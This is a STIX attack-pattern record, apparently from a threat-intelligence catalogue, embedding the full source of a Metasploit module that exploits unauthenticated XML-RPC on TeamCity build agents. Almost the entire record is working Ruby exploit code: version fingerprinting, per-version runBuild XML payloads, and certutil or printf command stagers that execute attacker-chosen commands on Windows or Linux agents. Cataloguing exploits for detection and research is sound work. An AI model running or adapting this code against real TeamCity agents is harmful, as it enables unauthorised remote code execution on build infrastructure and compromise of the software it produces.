{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1759127-6a62-4f4d-8a2a-941cdac76e00",
    "created": "2024-08-14T17:06:42.033633Z",
    "modified": "2024-08-14T17:06:42.033637Z",
    "name": "TeamCity Agent XML-RPC Command Execution",
    "description": "( This module allows remote code execution on TeamCity Agents configured to use bidirectional communication via xml-rpc. In bidirectional mode the TeamCity server pushes build commands to the Build Agents over port TCP/9090 without requiring authentication. Up until version 10 this was the default configuration. This module supports TeamCity agents from version 6.0 onwards. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/teamcity_agent_xmlrpc_exec.rb",
            "external_id": "teamcity_agent_xmlrpc_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/plugins/nessus/94675"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TeamCity Agent XML-RPC Command Execution',\n      'Description'    => %q(\n        This module allows remote code execution on TeamCity Agents configured\n        to use bidirectional communication via xml-rpc. In bidirectional mode\n        the TeamCity server pushes build commands to the Build Agents over port\n        TCP/9090 without requiring authentication. Up until version 10 this was\n        the default configuration. This module supports TeamCity agents from\n        version 6.0 onwards.\n      ),\n      'Author'         => ['Dylan Pindur <dylanpindur@gmail.com>'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'https://www.tenable.com/plugins/nessus/94675']\n        ],\n      'Platform'       => %w[linux win],\n      'Targets'        =>\n        [\n          ['Windows', { 'Platform' => 'win' }],\n          ['Linux', { 'Platform' => 'linux' }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-04-14'))\n\n    deregister_options('SRVHOST', 'SRVPORT', 'URIPATH', 'VHOST')\n    register_options(\n      [\n        Opt::RPORT(9090),\n        OptString.new(\n          'CMD',\n          [false, 'Execute this command instead of using command stager', '']\n        )\n      ]\n    )\n  end\n\n  def check\n    version = determine_version\n    if !version.nil? && version >= 15772\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    version = determine_version\n    if version.nil?\n      fail_with(Failure::NoTarget, 'Could not determine TeamCity Agent version')\n    else\n      print_status(\"Found TeamCity Agent running build version #{version}\")\n    end\n\n    unless datastore['CMD'].blank?\n      print_status('Executing user supplied command')\n      execute_command(datastore['CMD'], version)\n      return\n    end\n\n    case target['Platform']\n    when 'linux'\n      linux_stager(version)\n    when 'win'\n      windows_stager(version)\n    else\n      fail_with(Failure::NoTarget, 'Unsupported target platform!')\n    end\n  end\n\n  def windows_stager(version)\n    print_status('Constructing Windows payload')\n\n    stager = generate_cmdstager(\n      flavor: :certutil,\n      temp: '.',\n      concat_operator: \"\\n\",\n      nodelete: true\n    ).join(\"\\n\")\n    stager = stager.gsub(/^(?<exe>.{5}\\.exe)/, 'start \"\" \\k<exe>')\n\n    xml_payload = build_request(stager, version)\n    if xml_payload.nil?\n      fail_with(Failure::NoTarget, \"No compatible build config for TeamCity build #{version}\")\n    end\n\n    print_status(\"Found compatible build config for TeamCity build #{version}\")\n    send_request(xml_payload)\n  end\n\n  def linux_stager(version)\n    print_status('Constructing Linux payload')\n\n    stager = generate_cmdstager(\n      flavor: :printf,\n      temp: '.',\n      concat_operator: \"\\n\",\n      nodelete: true\n    ).join(\"\\n\")\n    stager << ' &amp;'\n\n    xml_payload = build_request(stager, version)\n    if xml_payload.nil?\n      fail_with(Failure::NoTarget, \"No compatible build config for TeamCity build #{version}\")\n    end\n\n    print_status(\"Found compatible build config for TeamCity build #{version}\")\n    send_request(xml_payload)\n  end\n\n  def execute_command(cmd, version)\n    xml_payload = build_request(cmd, version)\n\n    if xml_payload.nil?\n      fail_with(Failure::NoTarget, \"No compatible build config for TeamCity build #{version}\")\n    end\n\n    print_status(\"Found compatible build config for TeamCity build #{version}\")\n    send_request(xml_payload)\n  end\n\n  def determine_version\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.getVersion</methodName>\n  <params></params>\n</methodCall>\n    )\n    res = send_request_cgi(\n      {\n        'uri'    => '/',\n        'method' => 'POST',\n        'ctype'  => 'text/xml',\n        'data'   => xml_payload.strip!\n      },\n      10\n    )\n\n    if !res.nil? && res.code == 200\n      xml_doc = res.get_xml_document\n      if xml_doc.errors.empty?\n        val = xml_doc.xpath('/methodResponse/params/param/value')\n        if val.length == 1\n          return val.text.to_i\n        end\n      end\n    end\n    return nil\n  end\n\n  def send_request(xml_payload)\n    res = send_request_cgi(\n      {\n        'uri'    => '/',\n        'method' => 'POST',\n        'ctype'  => 'text/xml',\n        'data'   => xml_payload\n      },\n      10\n    )\n\n    if !res.nil? && res.code == 200\n      print_status(\"Successfully sent build configuration\")\n    else\n      print_status(\"Failed to send build configuration\")\n    end\n  end\n\n  def build_request(script_content, version)\n    case version\n    when 0..15771\n      return nil\n    when 15772..17794\n      return req_teamcity_6(script_content)\n    when 17795..21240\n      return req_teamcity_6_5(script_content)\n    when 21241..27401\n      return req_teamcity_7(script_content)\n    when 27402..32059\n      return req_teamcity_8(script_content)\n    when 32060..42001\n      return req_teamcity_9(script_content)\n    when 42002..46532\n      return req_teamcity_10(script_content)\n    else\n      return req_teamcity_2017(script_content)\n    end\n  end\n\n  def req_teamcity_2017(script_content)\n    build_code = Rex::Text.rand_text_alpha(8)\n    build_id = Rex::Text.rand_text_numeric(8)\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.runBuild</methodName>\n  <params>\n    <param>\n      <value>\n        <![CDATA[\n          <AgentBuild>\n            <myBuildId>#{build_id}</myBuildId>\n            <myBuildTypeId>x</myBuildTypeId>\n            <myBuildTypeExternalId>x</myBuildTypeExternalId>\n            <myCheckoutType>ON_AGENT</myCheckoutType>\n            <myVcsSettingsHashForServerCheckout>x</myVcsSettingsHashForServerCheckout>\n            <myVcsSettingsHashForAgentCheckout>#{build_code}</myVcsSettingsHashForAgentCheckout>\n            <myVcsSettingsHashForManualCheckout>x</myVcsSettingsHashForManualCheckout>\n            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>\n            <myServerParameters class=\"StringTreeMap\">\n              <k>system.build.number</k>\n              <v>0</v>\n            </myServerParameters>\n            <myAccessCode/>\n            <myArtifactDependencies/>\n            <myArtifactPaths/>\n            <myArtifactStorageSettings/>\n            <myBuildFeatures/>\n            <myBuildTypeOptions/>\n            <myFullCheckoutReasons/>\n            <myParametersSpecs class=\"StringTreeMap\"/>\n            <myPersonalVcsChanges/>\n            <myUserBuildParameters/>\n            <myVcsChanges/>\n            <myVcsRootCurrentRevisions class=\"tree-map\"/>\n            <myVcsRootEntries/>\n            <myVcsRootOldRevisions class=\"tree-map\"/>\n            <myBuildRunners>\n              <jetbrains.buildServer.agentServer.BuildRunnerData>\n                <myId>x</myId>\n                <myIsDisabled>false</myIsDisabled>\n                <myRunType>simpleRunner</myRunType>\n                <myRunnerName>x</myRunnerName>\n                <myChildren class=\"list\"/>\n                <myServerParameters class=\"tree-map\">\n                  <entry>\n                    <string>teamcity.build.step.name</string>\n                    <string>x</string>\n                  </entry>\n                </myServerParameters>\n                <myRunnerParameters class=\"tree-map\">\n                  <entry>\n                    <string>script.content</string>\n                    <string>#{script_content}</string>\n                  </entry>\n                  <entry>\n                    <string>teamcity.step.mode</string>\n                    <string>default</string>\n                  </entry>\n                  <entry>\n                    <string>use.custom.script</string>\n                    <string>true</string>\n                  </entry>\n                </myRunnerParameters>\n              </jetbrains.buildServer.agentServer.BuildRunnerData>\n            </myBuildRunners>\n          </AgentBuild>\n        ]]>\n      </value>\n    </param>\n  </params>\n</methodCall>\n    )\n    return xml_payload.strip!\n  end\n\n  def req_teamcity_10(script_content)\n    build_code = Rex::Text.rand_text_alpha(8)\n    build_id = Rex::Text.rand_text_numeric(8)\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.runBuild</methodName>\n  <params>\n    <param>\n      <value>\n        <![CDATA[\n          <AgentBuild>\n            <myBuildId>#{build_id}</myBuildId>\n            <myBuildTypeId>x</myBuildTypeId>\n            <myBuildTypeExternalId>x</myBuildTypeExternalId>\n            <myCheckoutType>ON_AGENT</myCheckoutType>\n            <myVcsSettingsHashForServerCheckout>x</myVcsSettingsHashForServerCheckout>\n            <myVcsSettingsHashForAgentCheckout>#{build_code}</myVcsSettingsHashForAgentCheckout>\n            <myVcsSettingsHashForManualCheckout>x</myVcsSettingsHashForManualCheckout>\n            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>\n            <myServerParameters class=\"StringTreeMap\">\n              <k>system.build.number</k>\n              <v>0</v>\n            </myServerParameters>\n            <myAccessCode/>\n            <myArtifactDependencies/>\n            <myArtifactPaths/>\n            <myBuildFeatures/>\n            <myBuildTypeOptions/>\n            <myFullCheckoutReasons/>\n            <myParametersSpecs class=\"StringTreeMap\"/>\n            <myPersonalVcsChanges/>\n            <myUserBuildParameters/>\n            <myVcsChanges/>\n            <myVcsRootCurrentRevisions class=\"tree-map\"/>\n            <myVcsRootEntries/>\n            <myVcsRootOldRevisions class=\"tree-map\"/>\n            <myBuildRunners>\n              <jetbrains.buildServer.agentServer.BuildRunnerData>\n                <myId>x</myId>\n                <myIsDisabled>false</myIsDisabled>\n                <myRunType>simpleRunner</myRunType>\n                <myRunnerName>x</myRunnerName>\n                <myChildren class=\"list\"/>\n                <myServerParameters class=\"tree-map\">\n                  <entry>\n                    <string>teamcity.build.step.name</string>\n                    <string>x</string>\n                  </entry>\n                </myServerParameters>\n                <myRunnerParameters class=\"tree-map\">\n                  <entry>\n                    <string>script.content</string>\n                    <string>#{script_content}</string>\n                  </entry>\n                  <entry>\n                    <string>teamcity.step.mode</string>\n                    <string>default</string>\n                  </entry>\n                  <entry>\n                    <string>use.custom.script</string>\n                    <string>true</string>\n                  </entry>\n                </myRunnerParameters>\n              </jetbrains.buildServer.agentServer.BuildRunnerData>\n            </myBuildRunners>\n          </AgentBuild>\n        ]]>\n      </value>\n    </param>\n  </params>\n</methodCall>\n    )\n    return xml_payload.strip!\n  end\n\n  def req_teamcity_9(script_content)\n    build_id = Rex::Text.rand_text_numeric(8)\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.runBuild</methodName>\n  <params>\n    <param>\n      <value>\n        <![CDATA[\n          <AgentBuild>\n            <myBuildId>#{build_id}</myBuildId>\n            <myBuildTypeId>x</myBuildTypeId>\n            <myBuildTypeExternalId>x</myBuildTypeExternalId>\n            <myCheckoutType>ON_AGENT</myCheckoutType>\n            <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>\n            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>\n            <myServerParameters class=\"StringTreeMap\">\n              <k>system.build.number</k>\n              <v>0</v>\n            </myServerParameters>\n            <myAccessCode/>\n            <myArtifactDependencies/>\n            <myArtifactPaths/>\n            <myBuildFeatures/>\n            <myBuildTypeOptions/>\n            <myFullCheckoutReasons/>\n            <myPersonalVcsChanges/>\n            <myUserBuildParameters/>\n            <myVcsChanges/>\n            <myVcsRootCurrentRevisions class=\"tree-map\"/>\n            <myVcsRootEntries/>\n            <myVcsRootOldRevisions class=\"tree-map\"/>\n            <myBuildRunners>\n              <jetbrains.buildServer.agentServer.BuildRunnerData>\n                <myId>x</myId>\n                <myIsDisabled>false</myIsDisabled>\n                <myRunType>simpleRunner</myRunType>\n                <myRunnerName>x</myRunnerName>\n                <myChildren class=\"list\"/>\n                <myServerParameters class=\"tree-map\">\n                  <entry>\n                    <string>teamcity.build.step.name</string>\n                    <string>x</string>\n                  </entry>\n                </myServerParameters>\n                <myRunnerParameters class=\"tree-map\">\n                  <entry>\n                    <string>script.content</string>\n                    <string>#{script_content}</string>\n                  </entry>\n                  <entry>\n                    <string>teamcity.step.mode</string>\n                    <string>default</string>\n                  </entry>\n                  <entry>\n                    <string>use.custom.script</string>\n                    <string>true</string>\n                  </entry>\n                </myRunnerParameters>\n              </jetbrains.buildServer.agentServer.BuildRunnerData>\n            </myBuildRunners>\n          </AgentBuild>\n        ]]>\n      </value>\n    </param>\n  </params>\n</methodCall>\n    )\n    return xml_payload.strip!\n  end\n\n  def req_teamcity_8(script_content)\n    build_id = Rex::Text.rand_text_numeric(8)\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.runBuild</methodName>\n  <params>\n    <param>\n      <value>\n        <![CDATA[\n          <AgentBuild>\n            <myBuildId>#{build_id}</myBuildId>\n            <myBuildTypeId>x</myBuildTypeId>\n            <myCheckoutType>ON_AGENT</myCheckoutType>\n            <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>\n            <myServerParameters class=\"tree-map\">\n              <entry>\n                <string>system.build.number</string>\n                <string>0</string>\n              </entry>\n            </myServerParameters>\n            <myAccessCode/>\n            <myArtifactDependencies/>\n            <myArtifactPaths/>\n            <myBuildTypeOptions/>\n            <myFullCheckoutReasons/>\n            <myPersonalVcsChanges/>\n            <myUserBuildParameters/>\n            <myVcsChanges/>\n            <myVcsRootCurrentRevisions class=\"tree-map\"/>\n            <myVcsRootEntries/>\n            <myVcsRootOldRevisions class=\"tree-map\"/>\n            <myBuildRunners>\n              <jetbrains.buildServer.agentServer.BuildRunnerData>\n                <myId>x</myId>\n                <myIsDisabled>false</myIsDisabled>\n                <myRunType>simpleRunner</myRunType>\n                <myRunnerName>x</myRunnerName>\n                <myChildren class=\"list\"/>\n                <myServerParameters class=\"tree-map\">\n                    <entry>\n                      <string>teamcity.build.step.name</string>\n                      <string>x</string>\n                    </entry>\n                  </myServerParameters>\n                <myRunnerParameters class=\"tree-map\">\n                  <entry>\n                    <string>script.content</string>\n                    <string>#{script_content}</string>\n                  </entry>\n                  <entry>\n                    <string>teamcity.step.mode</string>\n                    <string>default</string>\n                  </entry>\n                  <entry>\n                    <string>use.custom.script</string>\n                    <string>true</string>\n                  </entry>\n                  </myRunnerParameters>\n                </jetbrains.buildServer.agentServer.BuildRunnerData>\n            </myBuildRunners>\n            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>\n            <myBuildFeatures/>\n          </AgentBuild>\n        ]]>\n      </value>\n    </param>\n  </params>\n</methodCall>\n    )\n    return xml_payload.strip!\n  end\n\n  def req_teamcity_7(script_content)\n    build_id = Rex::Text.rand_text_numeric(8)\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.runBuild</methodName>\n  <params>\n    <param>\n      <value>\n        <![CDATA[\n          <AgentBuild>\n            <myBuildId>#{build_id}</myBuildId>\n            <myBuildTypeId>x</myBuildTypeId>\n            <myCheckoutType>ON_AGENT</myCheckoutType>\n            <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>\n            <myServerParameters class=\"tree-map\">\n              <no-comparator/>\n              <entry>\n                <string>system.build.number</string>\n                <string>0</string>\n              </entry>\n            </myServerParameters>\n            <myVcsRootOldRevisions class=\"tree-map\">\n              <no-comparator/>\n            </myVcsRootOldRevisions>\n            <myVcsRootCurrentRevisions class=\"tree-map\">\n              <no-comparator/>\n            </myVcsRootCurrentRevisions>\n            <myAccessCode/>\n            <myArtifactDependencies/>\n            <myArtifactPaths/>\n            <myBuildTypeOptions/>\n            <myFullCheckoutReasons/>\n            <myPersonalVcsChanges/>\n            <myUserBuildParameters/>\n            <myVcsChanges/>\n            <myVcsRootEntries/>\n            <myBuildRunners>\n              <jetbrains.buildServer.agentServer.BuildRunnerData>\n                <myRunType>simpleRunner</myRunType>\n                <myRunnerName>x</myRunnerName>\n                <myRunnerParameters class=\"tree-map\">\n                  <no-comparator/>\n                  <entry>\n                    <string>script.content</string>\n                    <string>#{script_content}</string>\n                  </entry>\n                  <entry>\n                    <string>teamcity.step.mode</string>\n                    <string>default</string>\n                  </entry>\n                  <entry>\n                    <string>use.custom.script</string>\n                    <string>true</string>\n                  </entry>\n                </myRunnerParameters>\n                <myServerParameters class=\"tree-map\">\n                  <no-comparator/>\n                  <entry>\n                    <string>teamcity.build.step.name</string>\n                    <string>x</string>\n                  </entry>\n                </myServerParameters>\n              </jetbrains.buildServer.agentServer.BuildRunnerData>\n            </myBuildRunners>\n            <myDefaultExecutionTimeout>3</myDefaultExecutionTimeout>\n            <myBuildFeatures/>\n          </AgentBuild>\n        ]]>\n      </value>\n    </param>\n  </params>\n</methodCall>\n    )\n    return xml_payload.strip!\n  end\n\n  def req_teamcity_6_5(script_content)\n    build_id = Rex::Text.rand_text_numeric(8)\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.run</methodName>\n  <params>\n    <param>\n      <value>\n        <![CDATA[\n          <AgentBuild>\n            <myBuildId>#{build_id}</myBuildId>\n            <myBuildTypeId>x</myBuildTypeId>\n            <myPersonal>false</myPersonal>\n            <myCheckoutType>ON_AGENT</myCheckoutType>\n            <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>\n            <myServerParameters class=\"tree-map\">\n              <no-comparator/>\n              <entry>\n                <string>system.build.number</string>\n                <string>0</string>\n              </entry>\n            </myServerParameters>\n            <myVcsRootOldRevisions class=\"tree-map\">\n              <no-comparator/>\n            </myVcsRootOldRevisions>\n            <myVcsRootCurrentRevisions class=\"tree-map\">\n              <no-comparator/>\n            </myVcsRootCurrentRevisions>\n            <myAccessCode/>\n            <myArtifactDependencies/>\n            <myBuildTypeOptions/>\n            <myPersonalVcsChanges/>\n            <myUserBuildParameters/>\n            <myVcsChanges/>\n            <myVcsRootEntries/>\n            <myBuildRunners>\n              <jetbrains.buildServer.agentServer.BuildRunnerData>\n                <myRunType>simpleRunner</myRunType>\n                <myRunnerName>x</myRunnerName>\n                <myRunnerParameters class=\"tree-map\">\n                  <no-comparator/>\n                  <entry>\n                    <string>script.content</string>\n                    <string>#{script_content}</string>\n                  </entry>\n                  <entry>\n                    <string>use.custom.script</string>\n                    <string>true</string>\n                  </entry>\n                </myRunnerParameters>\n                <myServerParameters class=\"tree-map\">\n                  <no-comparator/>\n                </myServerParameters>\n              </jetbrains.buildServer.agentServer.BuildRunnerData>\n            </myBuildRunners>\n          </AgentBuild>\n        ]]>\n      </value>\n    </param>\n  </params>\n</methodCall>\n    )\n    return xml_payload.strip!\n  end\n\n  def req_teamcity_6(script_content)\n    build_id = Rex::Text.rand_text_numeric(8)\n    xml_payload = %(\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>buildAgent.run</methodName>\n    <params>\n      <param>\n        <value>\n          <![CDATA[\n            <AgentBuild>\n              <myBuildId>#{build_id}</myBuildId>\n              <myBuildTypeId>x</myBuildTypeId>\n              <myAccessCode></myAccessCode>\n              <myPersonal>false</myPersonal>\n              <myCheckoutType>ON_AGENT</myCheckoutType>\n              <myDefaultCheckoutDirectory>x</myDefaultCheckoutDirectory>\n              <myServerParameters class=\"tree-map\">\n                <no-comparator/>\n                <entry>\n                  <string>system.build.number</string>\n                  <string>0</string>\n                </entry>\n              </myServerParameters>\n              <myVcsRootOldRevisions class=\"tree-map\">\n                <no-comparator/>\n              </myVcsRootOldRevisions>\n              <myVcsRootCurrentRevisions class=\"tree-map\">\n                <no-comparator/>\n              </myVcsRootCurrentRevisions>\n              <myArtifactDependencies/>\n              <myBuildTypeOptions/>\n              <myPersonalVcsChanges/>\n              <myUserBuildParameters/>\n              <myVcsChanges/>\n              <myVcsRootEntries/>\n              <myBuildRunners>\n                <jetbrains.buildServer.agentServer.BuildRunnerData>\n                  <myRunType>simpleRunner</myRunType>\n                  <myServerParameters class=\"tree-map\">\n                    <no-comparator/>\n                  </myServerParameters>\n                  <myRunnerParameters class=\"tree-map\">\n                    <no-comparator/>\n                    <entry>\n                      <string>script.content</string>\n                      <string>#{script_content}</string>\n                    </entry>\n                    <entry>\n                      <string>use.custom.script</string>\n                      <string>true</string>\n                    </entry>\n                  </myRunnerParameters>\n                </jetbrains.buildServer.agentServer.BuildRunnerData>\n              </myBuildRunners>\n            </AgentBuild>\n          ]]>\n        </value>\n      </param>\n  </params>\n</methodCall>\n    )\n    return xml_payload.strip!\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-14",
    "x_mitre_platforms": [
        "%w[linux win]"
    ]
}